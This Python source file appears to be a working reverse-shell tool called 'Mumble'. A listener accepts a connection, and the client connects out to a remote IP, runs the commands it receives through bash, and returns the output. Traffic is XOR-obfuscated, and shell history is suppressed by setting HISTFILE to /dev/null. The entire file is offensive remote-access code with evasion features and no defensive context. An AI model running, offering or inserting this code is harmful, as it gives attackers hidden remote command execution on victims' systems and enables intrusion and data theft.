import sys
import socket
import subprocess

_RECV_BUF_SIZE_ = 60000
_SERVER_ = False
_CLIENT_ = False
_SERVER_IP_ = ""
_SERVER_PORT_ = 9101
_KEY_ = "MUMBLE"


class MumbleSocket(socket.socket):
    def __init__(self, sock: socket.socket):
        self.rs = sock

    def xor(self, source: any, key: str) -> bytes:
        if isinstance(source, bytes):
            source = source.decode()
        splt_arr = []
        xored_string = ""
        sl = len(source)
        kl = len(key)
        for i in range(sl):
            splt_arr.append((source[i], key[i % kl]))
        for s, k in splt_arr:
            xored_string += chr(ord(s) ^ ord(k))
        return xored_string.encode()

    def bind(self, __address: tuple):
        self.rs.bind(__address)

    def connect(self, __address: tuple):
        self.rs.connect(__address)

    def setsockopt(self, __level: int, __optname: int, __value: int):
        self.rs.setsockopt(__level, __optname, __value)

    def listen(self, __backlog: int = 1):
        self.rs.listen(__backlog)

    def accept(self) -> (socket.socket, list):
        new_sock, addr = self.rs.accept()
        return MumbleSocket(new_sock), addr

    def close(self):
        self.rs.close()

    def recv(self, __bufsize: int, __flags: int = 1) -> bytes:
        data = self.rs.recv(__bufsize)
        return self.xor(data, _KEY_)

    def send(self, __data: bytes, __flags: int = 1):
        data = self.xor(__data, _KEY_)
        return self.rs.send(data)

    def fileno(self):
        return self.rs.fileno()


def create_raw_socket() -> socket.socket:
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def get_default_env() -> dict:
    return {
        "PATH": "/usr/local/bin:/usr/bin:/bin",
        "TERM": "xterm-256color",
        "HISTFILE": "/dev/null",
    }


def get_current_user():
    return exec('stat $(tty) | grep Access | head -n1 | awk \'{print $6}\' | tr -d \')\'').replace("\n", "")


def get_hostname():
    f = open('/etc/hostname')
    h = f.read().replace("\n", "")
    f.close()
    return h


def get_ps1() -> str:
    return get_current_user() + "@" + get_hostname() + "# "


def exec(c: str, cwd: str = "/dev/shm") -> str:
    proc = subprocess.Popen(c, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, shell=True,
                            executable='/bin/bash',
                            env=get_default_env(),
                            cwd=cwd
                            )
    res, err = proc.communicate()
    return ''.join(
        [res.decode() if isinstance(res, bytes) else res, err.decode() if isinstance(err, bytes) else err]
    )


def do_server():
    rs = create_raw_socket()
    ms = MumbleSocket(rs)
    ms.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ms.bind(("0.0.0.0", _SERVER_PORT_))
    ms.listen()
    client_sd, addr = ms.accept()
    print(f"connect from {addr[0]}:{addr[1]}")
    while True:
        client_data = client_sd.recv(_RECV_BUF_SIZE_).decode()
        print(client_data, end="")
        to_client = input()
        client_sd.send(to_client.encode())
        if to_client == "quit":
            break
    ms.close()


def do_client():
    rs = create_raw_socket()
    ms = MumbleSocket(rs)
    try:
        ms.connect((_SERVER_IP_, _SERVER_PORT_))
    except ConnectionRefusedError:
        sys.exit("connection refused")
    prompt = get_ps1()
    first_prompt = True
    res = ""
    while True:
        to_server = ((prompt if first_prompt else "") + res + (prompt if not first_prompt else ""))
        ms.send(to_server.encode())
        server_data = ms.recv(_RECV_BUF_SIZE_).decode()
        if server_data == "quit":
            break
        res = exec(server_data)
        first_prompt = False
    ms.close()


def print_usage():
    print(
        "usage:\tpython3 ms.py -c server_ip:server_port\n\tpython3 ms.py -s server_port"
    )


def parse_argv():
    global _SERVER_, _CLIENT_, _SERVER_IP_, _SERVER_PORT_
    argv = sys.argv
    if "-h" in argv:
        print_usage()
        sys.exit(1)
    if len(argv) < 3:
        sys.exit(1)
    if argv[1] == "-s":
        _SERVER_ = True
        _SERVER_PORT_ = int(argv[2])
        return
    if argv[1] == "-c":
        _CLIENT_ = True
        _SERVER_IP_ = argv[2].split(":")[0]
        _SERVER_PORT_ = int(argv[2].split(":")[1])
        return
    sys.exit(1)


def main():
    parse_argv()
    if _SERVER_:
        do_server()
    elif _CLIENT_:
        do_client()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(1)
